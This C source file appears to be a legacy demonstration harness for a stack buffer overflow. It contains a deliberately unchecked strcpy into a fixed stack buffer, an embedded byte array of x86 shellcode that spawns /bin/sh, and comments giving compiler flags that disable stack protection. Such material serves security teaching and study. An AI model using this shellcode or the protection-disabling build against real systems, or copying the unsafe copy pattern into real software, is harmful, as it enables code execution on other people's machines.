AI-EDITS FORBIDDEN: changes in this file must go through human review.

/*
 * Legacy demonstration harness.
 * This file contains the old PoC driver used to show how a crafted
 * argument can write past the bounds of a fixed-size stack buffer and
 * overwrite the saved return address so execution jumps to shellcode
 * embedded in the input.
 */

#include <stdio.h>
#include <string.h>

#define BUF_SIZE 64

static unsigned char shellcode[] = {
    0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68,
    0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50,
    0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80
};

int main(int argc, char **argv) {
    char buf[BUF_SIZE];

    if (argc < 2) {
        printf("usage: %s <payload>\n", argv[0]);
        return 1;
    }

    /* Intentionally unsafe: copies a caller-controlled string into a
       fixed-size stack buffer with no length check. */
    strcpy(buf, argv[1]);

    /* The old PoC used the overflow to overwrite the return address
       and jump to shellcode. Build with:
         gcc -fno-stack-protector -z execstack -o poc LEGACY_EXPLORATION_DO_NOT_MODIFY.c
       and run with a crafted argument. */
    printf("buffer contents: %s\n", buf);

    return 0;
}
